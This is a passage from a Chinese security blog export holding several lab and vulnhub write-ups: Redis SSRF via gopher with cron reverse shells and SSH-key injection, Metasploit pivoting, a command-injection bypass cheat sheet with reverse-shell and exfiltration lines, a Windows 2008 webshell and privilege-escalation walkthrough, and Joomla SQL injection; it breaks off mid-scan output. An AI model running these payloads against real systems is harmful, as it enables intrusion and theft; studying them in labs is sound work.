1*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$63%0d%0a%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/192.168.64.142/2333 0&gt;&amp;1%0a%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a%0a%0a P.S. 需要注意的是，如果要换IP和端口，前面的$63也需要更改，$63表示字符串长度为63个字节 模拟ssrf访问： 123456789[root@localhost xm]# curl -v 'gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$63%0d%0a%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/192.168.64.142/2333 0&gt;&amp;1%0a%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a%0a%0a'* About to connect() to 127.0.0.1 port 6379 (#0)* Trying 127.0.0.1...* Connected to 127.0.0.1 (127.0.0.1) port 6379 (#0)+OK+OK+OK+OK+OK 在攻击机中nc -lvp 2333获得root权限shell 写入SSH key 这部分在第二天写的，但是情况发生了变化，上述方法出现了问题，不知道原因何在，因此换一种方法 但十分巧合的是，本部分使用的方法在昨天并不奏效 端口转发 1socat -v tcp-listen:4444,fork tcp-connect:localhost:6379 redis连接4444端口 1redis-cli -p 4444 输入payload 12345set x "\n\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC3cSUoWn+D43JQa7eMW983UcD+zuSkqNhJmg0lISd0i9cL4y4CkCy89i/suT6ABka+JTIzf/PppbgDBGGxdo/U9dZVVH+vBpdnQ+VLqjxs39t1dcT3PwbbCi39g+V2o0SOPoBh4Zz82o1GRylb7ry9WktrlUuaVf/tf5d/2MZIVztQPG67PJDFEjKugXLg5AQK03/gloCi09+klJVPWkrzXkenAkI5fw671XFRII3uW2+AQ+iMMEkW1ScfvpntKAJFcEkiQ4cROHT1gGabru3Z9dpXZDm0lb3tmnga9A5buMvNKpL+bseKQZvp7wFrnRgUvags6MJ7VwsXMNRwfGLr xm@xm\n\n\n"config set dir /root/.ssh/config set dbfilename authorized_keyssavequit 同时监听到数据： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546&gt; 2019/09/02 11:34:54.610419 length=420 from=17 to=436*3\r$3\rset\r$1\rx\r$392\rssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC3cSUoWn+D43JQa7eMW983UcD+zuSkqNhJmg0lISd0i9cL4y4CkCy89i/suT6ABka+JTIzf/PppbgDBGGxdo/U9dZVVH+vBpdnQ+VLqjxs39t1dcT3PwbbCi39g+V2o0SOPoBh4Zz82o1GRylb7ry9WktrlUuaVf/tf5d/2MZIVztQPG67PJDFEjKugXLg5AQK03/gloCi09+klJVPWkrzXkenAkI5fw671XFRII3uW2+AQ+iMMEkW1ScfvpntKAJFcEkiQ4cROHT1gGabru3Z9dpXZDm0lb3tmnga9A5buMvNKpL+bseKQZvp7wFrnRgUvags6MJ7VwsXMNRwfGLr xm@xm\r&lt; 2019/09/02 11:34:54.611433 length=5 from=10163 to=10167+OK\r&gt; 2019/09/02 11:35:09.983344 length=52 from=437 to=488*4\r$6\rconfig\r$3\rset\r$3\rdir\r$11\r/root/.ssh/\r&lt; 2019/09/02 11:35:09.983666 length=5 from=10168 to=10172+OK\r&gt; 2019/09/02 11:35:22.865691 length=64 from=489 to=552*4\r$6\rconfig\r$3\rset\r$10\rdbfilename\r$15\rauthorized_keys\r&lt; 2019/09/02 11:35:22.865862 length=5 from=10173 to=10177+OK\r&gt; 2019/09/02 11:35:26.353675 length=14 from=553 to=566*1\r$4\rsave\r&lt; 2019/09/02 11:35:26.354787 length=5 from=10178 to=10182+OK\r 使用python脚本进行转换 12[root@localhost ~]# python gopher.py 1.txt *3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$386%0d%0assh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC3cSUoWn+D43JQa7eMW983UcD+zuSkqNhJmg0lISd0i9cL4y4CkCy89i/suT6ABka+JTIzf/PppbgDBGGxdo/U9dZVVH+vBpdnQ+VLqjxs39t1dcT3PwbbCi39g+V2o0SOPoBh4Zz82o1GRylb7ry9WktrlUuaVf/tf5d/2MZIVztQPG67PJDFEjKugXLg5AQK03/gloCi09+klJVPWkrzXkenAkI5fw671XFRII3uW2+AQ+iMMEkW1ScfvpntKAJFcEkiQ4cROHT1gGabru3Z9dpXZDm0lb3tmnga9A5buMvNKpL+bseKQZvp7wFrnRgUvags6MJ7VwsXMNRwfGLr xm@xm%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$11%0d%0a/root/.ssh/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$15%0d%0aauthorized_keys%0d%0a*1%0d%0a$4%0d%0asave%0d%0a%0a%0a 成功生成authorized_keys 成功连接 其他问题 由于每一种Linux的定时任务文件位置不一，同时各种环境问题，可能会导致payload的执行失败 本文章的复现环境为centos7，尚未测试在Ubuntu下的情况，但从网络上的教程上来看，Ubuntu下复现反弹shell存在问题 这里照搬文章记一次失败漏洞利用的经历–ubuntu下的redis未授权访问漏洞复现和解决ubuntu任务计划写shell失败的问题 从两篇文章来看，Ubuntu下反弹shell失败的原因是通过redis写入定时任务文件中，存在大量的其他杂乱字符，这些字符在centos7下会被忽略，但是在Ubuntu下不会忽略，于是导致了通过定时任务弹shell的失败；但写入文件和ssh是可行的。 防御建议 修改redis.conf配置文件，改变高危命令名称 123rename-command FLUSHALL ""rename-command CONFIG ""rename-command EVAL "" 以低权限运行redis服务 为redis添加密码验证 禁止外网访问redis 1bind 127.0.0.1 开启保护模式protected mode yes 修改默认端口 1Port 6379 防火墙设置策略，设置ip白名单 参考文章 CENTOS7下安装redis 先知——Redis和SSRF 利用redis通过cron进行Getshell（配合SSRF利用） redis未授权访问与ssrf利用 利用 Gopher 协议拓展攻击面 redis getshell 总结 SSRF 漏洞学习 https://github.com/kingkaki/Exploit-scripts/tree/master/redis]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>web安全</tag>
        <tag>SSRF</tag>
        <tag>redis</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[使用MSF进行跳板]]></title>
    <url>%2F2019%2F08%2F27%2F%E4%BD%BF%E7%94%A8MSF%E8%BF%9B%E8%A1%8C%E8%B7%B3%E6%9D%BF%E6%94%BB%E5%87%BB%2F</url>
    <content type="text"><![CDATA[环境搭建环境介绍为了更真实地模拟现实情况，熟悉MSF跳转攻击内网其他主机的姿势，熟悉内网渗透，因此这里利用一个开源免费的火墙镜像文件M0n0wall在VMware虚拟机上搭建一个小型的带防火墙的网络。 由于所需虚拟机数量较多、占用内存较大，因此局域网1在本机VMware下搭建，局域网2在物理机局域网下的一台主机virtual box下搭建。 网络拓扑 搭建 搭建过程略微繁琐，有些地方非常坑人，花费大量时间在环境搭建上 此处简要概括主要步骤 局域网1防火墙安装 在VMware中创建一台虚拟机，安装m0n0wall，并设置两块网卡，一是与物理机桥接，而是设置为virtual host only 选择1，配置LAN以及WAN（le0、le1为网卡名称） 选择2，配置mono的LAN ip地址 安装成功： 攻击机配置 将攻击机kali的网卡设置为与防火墙virtual host only网卡，重新配置网络，IP发生变化 浏览器访问1.1.1.1，输入账号:admin，密码:mono，进入防火墙设置 首先，点击”WAN”-&gt;取消勾选” Block private networks”，经过测试，不关闭此选项物理机无法访问到防火墙以及映射的内网主机端口 然后，点击”NAT”，设置端口，将防火墙”公网”IP的端口，转发给内网攻击机的相应端口 先后转发80、4444端口 完成后，kali启动Apache服务，物理机访问防火墙公网IP，自动转发到了kali的Apache服务 局域网2virtualbox同VMware的操作大同小异，同样先安装好m0n0wall，进行各项设置。 但有一个深坑，m0n0wall上无法获取到WAN IP，后来得知，需要将使用的virtual host网卡的控制芯片更改为 安装成功后登陆浏览器进行设置，此处不用过多设置，默认允许内网访问到外网（但需假设xp无法访问到外网，仅能与内网主机windows7通信） 同时需要将Windows7、Windows xp的网卡设置为仅主机模式，完成后IP将自动发生变化 渗透复盘获取meterpreter shell在攻击机中生成后门程序 123456789msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.124 LPORT=4444 -a x86 --platform windows -b "\x00\xff" -e x86/shikata_ga_nai -f exe -o shell.exe#LHOST设置为防火墙公网ip#执行监听use exploit/multi/handler set payload windows/meterpreter/reverse_tcpset lhost 192.168.0.116set lport 4444exploit 将后门执行移动到web目录下，目标Windows7主机访问192.168.0.127/shell.exe下载并点击，MSF收到响应，在meterpreter下提权，并发现当前主机存在于内网 meterpreter进行跳板攻击添加路由 此处曾将后门进程迁移到其他进程上，但是无法成功扫描 1run autoroute -h 12run autoroute -s 2.2.2.0/24#添加路由run autoroute -p#显示添加的路由 扫描内网1.msf自带模块1use auxiliary/scanner/portscan/tcp#该扫描模式准确但速度慢 2.通过跳板使用nmap 使用GNU\Linux操作系统内置的ProxyChains工具，任何TCP连接都能通过TOR、SCOKS4、SOCKS、HTTP/HTTPS等代理方式进行转发。在这项隧道技术中，可以嵌套多层代理。除了提供匿名性以外，如跳板机这样的利用也能实现向隔离的内部网络导入流量。 建立好路由后直接使用nmap去扫描内网主机是不可行的，需要通过socks4代理进行流量转发。 123use auxiliary/server/socks4a set SRVHOST 1.1.1.10 #攻击者IPrun 然后标记本地文件vim /etc/proxychains.conf，最后一行修改为SRVHOST的IP 1234567--- snippet ---[ProxyList]# add proxy here ...# meanwile# defaults set to "tor"#socks4 127.0.0.1 9050socks4 1.1.1.10 1080 payload： 1proxychains nmap -sT -sV -Pn -n -p22,80,135,139,445 --script=smb-vuln-ms08-067.nse -A 2.2.2.21 远程溢出漏洞利用ms08_067漏洞，此处LHOST设置为作为跳板的Windows7，因为xp无法直接连接外网 端口转发1portfwd -h 将xp系统的3389端口转发至本地 连接本地端口3389 参考文章 虚拟机M0n0wall软件防火墙配置 M0N0wall搭建情况 通过双重跳板漫游隔离内网]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>MSF</tag>
        <tag>内网渗透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[命令执行漏洞总结]]></title>
    <url>%2F2019%2F08%2F27%2F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[前言最近突然想到过去遇到命令执行漏洞时无法正常写文件，权限设置为777页无济于事，同时发现过去的笔记中有关命令执行漏洞的总结较少，因此这里重新总结一次。 关于无法写文件：将当前web目录的文件所有者更改为apache：chown apache:apache html即可 命令执行漏洞 命令执行漏洞是指应用有时需要调用一些执行系统命令的函数，如：system()、exec()、shell_exec()、eval()、passthru()，``等函数，代码未对用户可控参数做过滤，当用户能控制这些函数中的参数时，就可以将恶意系统命令拼接到正常命令中，从而造成命令执行攻击。 命令执行几种方式 函数 注意事项 system() passthru() exec()、shell_exec() 无回显 反引号`` 命令交给shell_exec()执行 popen()、proc_open() 无回显，返回文件指针，但命令执行了的 以popen()为例： 123&lt;?php popen('whoami &gt;&gt;/tmp/1.txt','r');?&gt; 查看1.txt得到结果 命令执行绕过技巧空格绕过 &lt; 与 &lt;&gt; 仅适用于文件读取等操作，例如：cat&lt;flag %09 TAB的url编码 ${IFS} $IFS$9 ${IFS},$IFS,$IFS$9的区别，首先$IFS在linux下表示分隔符，然而本地实验却会发生这种情况，这里解释一下,单纯的cat$IFS2,bash解释器会把整个IFS2当做变量名，所以导致输不出来结果，然而如果加一个{}就固定了变量名，同理在后面加个$可以起到截断的作用，但是为什么要用$9呢，因为$9只是当前系统shell进程的第九个参数的持有者，它始终为空字符串。 命令连接符 分隔符 含义 %0a 换行符 %0d 回车符 ; 在Linux shell中担任连续指令[将显示所有指令结果] &amp; A&amp;B 简单拼接无制约关系。如果A为假，则B立即执行 | A|B 左边输出作为右边的输入，显示B的执行结果 &amp;&amp; A&amp;&amp;B 只有A执行成功，B才会执行 || A||B 只有A执行失败，B才会执行 黑名单绕过 ${PS2} 对应字符 &gt; ${PS4} 对应字符 + ${9} 对应 空字符串 变量拼接1a=l;b=s;$a$b base64编码12echo Y2F0IDEudHh0|base64 -d|bash#cat 1.txt 十六进制编码1234#编码echo "cat 1.txt"|xxd -p#解码echo "63617420312e7478740a"|xxd -r -p |bash 单、双引号1ca""t fla''g 反斜线1c\a\t f\l\a\g 无回显的命令执行反弹shell 此处列举的反弹shell存在局限性，一些环境下无法正常使用，之后重新总结一下反弹shell 123|bash -i &gt;&amp; /dev/tcp/xxxxxI(你的vps的公网ip)/8080 0&gt;&amp;1#远程监听nc -lvp 8080 DNSLOG ``中的命令实际上调用了shell_exec()函数 12curl http://07isyd.dnslog.cn/`whoami`ping `whoami`.07isyd.dnslog.cn curl上传文件 curl -F将flag文件上传至Burpsuite中的Collaborator Client，类似于DNSLOG，但可以查看POST请求包 实际上也可以将flag文件上传至vps某个端口监听 打开Collaborator Client： 12打开Burp主界面 --&gt;菜单（Burp）--&gt;Burp Collaboraor Client -- &gt; 点击 Copy to Clipboard粘贴出来大概这样：XXXXXXXXXXXXXXXXXXXXXX.burpcollaborator.net 短命令执行 大体思路为将命令分割为一个个小部分，写成文件名，再通过ls写入到一个文件中并执行。 但利用起来发现也挺苛刻的，网上一些教程复现下来失败 复现反思： 直接利用1&gt;1这样的方式写命令是不可行的，因为执行ls -t &gt; a这一步会在每一个文件名的后面加一个换行符，导致无法执行。 两个反斜杠\\，这种方法是利用\来拼接字符串，其中前一个\是用来转义后一个\的。这种方法的话需要精心构造输入，利用倒叙来输入，然后ls的时候需要加-t参数来排列一下，虽然报错了但是也执行成功了。 环境：物理机web目录index.html中写入phpinfo 12345678910&gt;hp&gt;ell.p\\&gt;\ sh\\&gt;\ -O\\&gt;0.117\\&gt;168.\\&gt;\ 192.\\&gt;wget\\ls -t&gt;ash a 然后生成shell.php，访问即phpinfo界面 IP绕过转换网址 进制转换 例如：127.0.0.1 =&gt; 017700000001 将IP的每一位先从十进制转换为十六进制，再转为八进制，在八进制前添加一个0. 漏洞防范命令防注入函数 escapeshellcmd()和escapeshellarg() escapeshellcmd(string $command): 顾名思义，该函数是过滤整条命令的从，传入参数为命令。 escapeshellcmd() 对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。 反斜线（\）会在以下字符之前插入： &amp;#`;|*?~&lt;&gt;^()[]{}$, \x0A 和 \xFF，’ 和 *”* 仅在不配对的时候被转义。 在Windows 平台上，所有这些字符以及 % 和 ! 字符都会被^转义。 在Linux平台上，字符被反斜杠\转义。 escapeshellarg(string $command): escapeshellarg()的功能是过滤参数，将参数限制在一对双引号里，确保参数为一个字符串，它会将双引号替换为空格 此处想顺便写一下，这两种函数一起用的时候也存在逃逸的情况： addslashes()等过滤sql语句的函数 参数白名单直接在代码或配置文件中限定某些参数，使用时候匹配一下这个参数是否不再这个白名单，如果不在则直接显示错误提示。 参考文章 浅谈CTF中命令执行与绕过的小技巧 无回显代码执行利用方法 命令执行的一些绕过技巧 ctf命令执行与绕过 巧用命令注入的N种方式 PHP复杂变量绕过addslashes()直接拿shell CTF命令执行及绕过技巧]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>web安全</tag>
        <tag>命令执行漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[windows2008渗透测试（一）]]></title>
    <url>%2F2019%2F08%2F16%2Fwindows2008_1%2F</url>
    <content type="text"><![CDATA[环境靶机： IP:192.168.64.139 系统：windows 2008 攻击机： IP:192.168.64.131 系统：kali 渗透信息收集nmap -A 192.168.64.139 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263Starting Nmap 7.70 ( https://nmap.org ) at 2019-06-06 08:35 EDTNmap scan report for 192.168.64.139Host is up (0.00041s latency).Not shown: 989 closed portsPORT STATE SERVICE VERSION80/tcp open http Microsoft IIS httpd 7.5| http-cookie-flags: | /: | ASPSESSIONIDQSCTABQS: |_ httponly flag not set| http-methods: |_ Potentially risky methods: TRACE|_http-server-header: Microsoft-IIS/7.5|_http-title: \xC4\xCF\xB7\xBD\xCA\xFD\xBE\xDD\xC6\xF3\xD2\xB5\xCD\xF8\xD5\xBE\xB9\xDC\xC0\xED\xCF\xB5\xCD\xB3135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn445/tcp open microsoft-ds Windows Server 2008 R2 Datacenter 7601 Service Pack 1 microsoft-ds| ssl-cert: Subject: commonName=WIN-1DT2786LMA0| Not valid before: 2019-06-02T11:44:10|_Not valid after: 2019-12-02T11:44:10|_ssl-date: 2019-06-06T12:36:55+00:00; +2s from scanner time.49152/tcp open msrpc Microsoft Windows RPC49153/tcp open msrpc Microsoft Windows RPC49154/tcp open msrpc Microsoft Windows RPC49155/tcp open msrpc Microsoft Windows RPC49156/tcp open msrpc Microsoft Windows RPC49157/tcp open msrpc Microsoft Windows RPCMAC Address: 00:0C:29:96:7E:A1 (VMware)Device type: general purposeRunning: Microsoft Windows 7|2008|8.1OS CPE: cpe:/o:microsoft:windows_7::- cpe:/o:microsoft:windows_7::sp1 cpe:/o:microsoft:windows_server_2008::sp1 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows_8.1OS details: Microsoft Windows 7 SP0 - SP1, Windows Server 2008 SP1, Windows Server 2008 R2, Windows 8, or Windows 8.1 Update 1Network Distance: 1 hopService Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windowsHost script results:|_clock-skew: mean: -1h59m58s, deviation: 4h00m00s, median: 1s|_nbstat: NetBIOS name: WIN-1DT2786LMA0, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 00:0c:29:96:7e:a1 (VMware)| smb-os-discovery: | OS: Windows Server 2008 R2 Datacenter 7601 Service Pack 1 (Windows Server 2008 R2 Datacenter 6.1)| OS CPE: cpe:/o:microsoft:windows_server_2008::sp1| Computer name: WIN-1DT2786LMA0| NetBIOS computer name: WIN-1DT2786LMA0\x00| Workgroup: WORKGROUP\x00|_ System time: 2019-06-06T20:36:55+08:00| smb-security-mode: | account_used: guest| authentication_level: user| challenge_response: supported|_ message_signing: disabled (dangerous, but default)| smb2-security-mode: | 2.02: |_ Message signing enabled but not required| smb2-time: | date: 2019-06-06 08:36:56|_ start_date: 2019-06-06 08:16:59TRACEROUTEHOP RTT ADDRESS1 0.41 ms 192.168.64.139OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 77.67 seconds 445端口考虑是否存在ms17-010漏洞，此处使用 nmap --script smb-vuln-ms17-010 192.168.64.139 探测发现445端口不存在漏洞，该系统存在补丁，无法利用； 80端口开启，存在http服务，考虑从web漏洞渗透 容器探测whatweb 192.168.64.139 经过搜索，该网站后台路径暴露，但后台主页显示的账号密码均为错误信息。 该网站系统为南方数据cms，从此从网络上搜索出漏洞资料，得到用户名及密码： username:admin password:roottoor GETSHELL登录后台后有三种思路： 上传文件 网站配置中插入asp一句话 数据库备份拿webshell 经过验证，上传文件无法上传asp、aspx文件；网站配置插入一句话导致网站崩溃。 因而这里采取数据库备份： 首先将asp一句话木马的后缀修改位合法后缀名，例如：ok.png； 完成后上传该文件，记录上传后的路径：UploadFiles/20196621207602.png 123456&lt;%Function MorfiCoder(Code)MorfiCoder=Replace(Replace(StrReverse(Code),&quot;/*/&quot;,&quot;&quot;&quot;&quot;),&quot;\*\&quot;,vbCrlf)End FunctionExecute MorfiCoder(&quot;)/*/z/*/(tseuqer lave&quot;)%&gt; 打开系统管理-&gt;数据库备份，如图操作： 原理：此处数据库备份将原文件覆盖重写，将ok.png修改为shell.asp 访问该文件，并连接蚁剑，发现权限为：iis apppool\nfsj，需要进一步提权。 提权 利用msf生成后门程序，将该程序上传至服务器上 1234567msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.64.121 lport=8888 -f exe &gt; /root/Desktop/load.exeuse exploit/multi/handlerset payload windows/meterpreter/reverse_tcpset lhost 192.168.64.121set port 8888run 完成后在蚁剑虚拟终端中执行该文件，在msf中会接收到会话，自动进入meterpreter 【需要使用的几个命令】 sessions:查看接收到的session session -i [id]:进入到指定id的session中 background:后台挂起该会话 execute -f cmd.exe -:调用目标系统的cmd getsystem:使用默认一些方法提（不一定成功） 上传提权EXP:CVE-2018-8639，并在cmd中执行该exp(webshell中没有回显) 注意，该exp极不稳定，运行后显示以下信息，表示已经开始运行 执行过程中不断whoami查看权限变化： 取得系统权限后，创建账号并加入管理员组 12net user admin abc123ABC /adnet localgroup administrators admin /add 成功后发现3389端口并未开启，这里采取以下办法开启3389——参考文章 12345678echo Windows Registry Editor Version 5.00 &gt;3389.regecho. &gt;&gt;3389.regecho [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server] &gt;&gt;3389.regecho "fDenyTSConnections"=dword:00000000 &gt;&gt;3389.regecho [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds\tcp] &gt;&gt;3389.regecho "PortNumber"=dword:00000d3d &gt;&gt;3389.regecho [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp] &gt;&gt;3389.regecho "PortNumber"=dword:00000d3d &gt;&gt;3389.reg 再在提权状态下，cmd中输入：regedit /s 3389.reg 执行 【这个exp运行初期考人品，但是后期会发现存在规律~在卡顿的那空白一行中输入不会出现错误】 关闭防火墙： 1netsh firewall set opmode mode=disable 然后3389开启，远程登录即可~ kali远程协助：rdesktop -u admin -p abc123ABC -g 1024*720 192.168.64.139 Windows远程协助：mstsc 参考文章 msf生成常用payload 正向与反向反弹shell]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>提权</tag>
        <tag>Windows</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DC-3渗透实战]]></title>
    <url>%2F2019%2F08%2F16%2FDC-3%2F</url>
    <content type="text"><![CDATA[前言难度中，涉及到Joomla! CMS、john 渗透信息收集netdiscover -r 192.168.64.0/24 nmap -A 192.168.64.156 目录扫描=&gt; http://192.168.64.157/administrator/，发现为Joomla! CMS 使用JoomScan工具检测 1perl joomscan.pl -u http://192.168.64.157/ sql注入12searchsploit joomla | grep 3.7 cat /usr/share/exploitdb/platforms/php/webapps/42033.txt 12##########################################payload########################################sqlmap -u "http://localhost/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering] 爆表： 1sqlmap -u "http://192.168.64.157/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D joomladb --tables 爆字段： 1sqlmap -u "http://192.168.64.157/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D joomladb -T "#__users" --columns dump： 1sqlmap -u "http://192.168.64.157/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D joomladb -T "#__users" --dump 账号：admin 密码：$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu hash破解12vim hash #写入密码john --wordlist=/usr/share/john/password.lst ./hash GETSHELL登录后台（U:admin、P:snoop） 选取模板管理，编辑index.php文件 sf反弹shell1234567msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.64.131 LPORT=4444 -f raw &gt; shell.php#########################################################################################use exploit/multi/handlerset PAYLOAD php/meterpreter_reverse_tcpset LHOST 192.168.88.128set LPORT 4444run 提权查看系统信息： 123cat /proc/versionuname -alsb_release -a exp： 搜寻提权exp要有耐心，很多exp是用不了的…… 123456#将exp移动至/var/www/html/cp /usr/share/exploitdb/exploits/linux/local/39772.txt /var/www/html/39772.txt#kali开启Apache/etc/init.d/apache2 start#下载至本机wget http://192.168.64.131/39772.txt 根据txt文件中描述，获取到exp: 上传至服务器，执行： 1234567891011=&gt;./compile.sh=&gt;./doubleputstarting writevwoohoo, got pointer reusewritev returned successfully. if this worked, you'll have a root shell in &lt;=60 seconds.suid file detected, launching rootshell...we have root privs now...^?bash: line 1: $'\177': command not found=&gt;iduid=0(root) gid=0(root) groups=0(root),33(www-data) 拓展 渗透过程中了解到或复习到的小知识点，记录下面便于今后查阅 Ubuntu开启ssh 安装opensshsudo apt-get install openssh-server 查看ssh状态ps -aux|grep ssh 启动服务service ssh start Ubuntu用户管理(普通用户-&gt;root) 创建用户 useradd test 设置密码 passwd test 修改/etc/passwd：root权限下修改uid：0 用户加入sudo组：在/etc/sudoers文件里给该用户添加权限 12345#root权限设置chmod u+w /etc/sudoersvi /etc/sudoers #找到这行 root ALL=(ALL) ALL,在他下面添加xxx ALL=(ALL) ALL (这里的xxx是你的用户名)chmod u-w /etc/sudoers John破解Linux密码教程 破解Linux下passwd、shadow中的密码 123456#合并passwd和shadowunshadow /etc/passwd /etc/shadow &gt; shadow#使用密码字典进行爆破john --wordlist=/usr/share/john/password.lst --rules shadow#不使用密码字典爆破john shadow 注意 john工具对于同一个shadow文件只会进行一次爆破，如果第二次执行john shadow是不会得到结果的 因此，查看上一次爆破结果：john --show shadow 参考文章使用john进行密码爆破 DC-3渗透实战]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>提权</tag>
        <tag>vulnhub</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[LazySysAdmin渗透实战]]></title>
    <url>%2F2019%2F08%2F10%2FLazySysAdmin%2F</url>
    <content type="text"><![CDATA[前言涉及：WordPress、Samba协议、enuml4inux和wpscan 难度中 渗透测试主机发现（1）netdiscover netdiscover是基于ARP的网络扫描工具 ARP是将IP地址转化物理地址的网络协议。通过该协议，可以判断某个IP地址是否被使用，从而发现网络中存活的主机。Kali Linux提供的netdiscover工具，就是借助该协议实施主机发现。它既可以以被动模式嗅探存活的主机，也可以以主动模式扫描主机。用户还可以根据网络稳定性，调整发包速度和数量。 payload:netdiscover -r 192.168.64.0/24 （2）nmap payload:nmap -sP 192.168.64.0/24 端口扫描payload:nmap -A -oN /root/Desktop/Lazysysadmin_info.csv 192.168.64.143 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667# Nmap 7.70 scan initiated Tue Jul 30 06:25:24 2019 as: nmap -A -oN /root/Desktop/Lazysysadmin_info.csv 192.168.64.143Nmap scan report for 192.168.64.143Host is up (0.00064s latency).Not shown: 994 closed portsPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 1024 b5:38:66:0f:a1:ee:cd:41:69:3b:82:cf:ad:a1:f7:13 (DSA)| 2048 58:5a:63:69:d0:da:dd:51:cc:c1:6e:00:fd:7e:61:d0 (RSA)| 256 61:30:f3:55:1a:0d:de:c8:6a:59:5b:c9:9c:b4:92:04 (ECDSA)|_ 256 1f:65:c0:dd:15:e6:e4:21:f2:c1:9b:a3:b6:55:a0:45 (ED25519)80/tcp open http Apache httpd 2.4.7 ((Ubuntu))|_http-generator: Silex v2.2.7| http-robots.txt: 4 disallowed entries |_/old/ /test/ /TR2/ /Backnode_files/|_http-server-header: Apache/2.4.7 (Ubuntu)|_http-title: Backnode139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)445/tcp open netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)3306/tcp open mysql MySQL (unauthorized)6667/tcp open irc InspIRCd| irc-info: | server: Admin.local| users: 1| servers: 1| chans: 0| lusers: 1| lservers: 0| source ident: nmap| source host: 192.168.64.131|_ error: Closing link: (nmap@192.168.64.131) [Client exited]MAC Address: 00:0C:29:DE:C8:B4 (VMware)Device type: general purposeRunning: Linux 3.X|4.XOS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4OS details: Linux 3.2 - 4.9Network Distance: 1 hopService Info: Hosts: LAZYSYSADMIN, Admin.local; OS: Linux; CPE: cpe:/o:linux:linux_kernelHost script results:|_clock-skew: mean: -8d02h13m08s, deviation: 5h46m24s, median: -7d22h53m09s|_nbstat: NetBIOS name: LAZYSYSADMIN, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)| smb-os-discovery: | OS: Windows 6.1 (Samba 4.3.11-Ubuntu)| Computer name: lazysysadmin| NetBIOS computer name: LAZYSYSADMIN\x00| Domain name: \x00| FQDN: lazysysadmin|_ System time: 2019-07-22T21:32:29+10:00| smb-security-mode: | account_used: guest| authentication_level: user| challenge_response: supported|_ message_signing: disabled (dangerous, but default)| 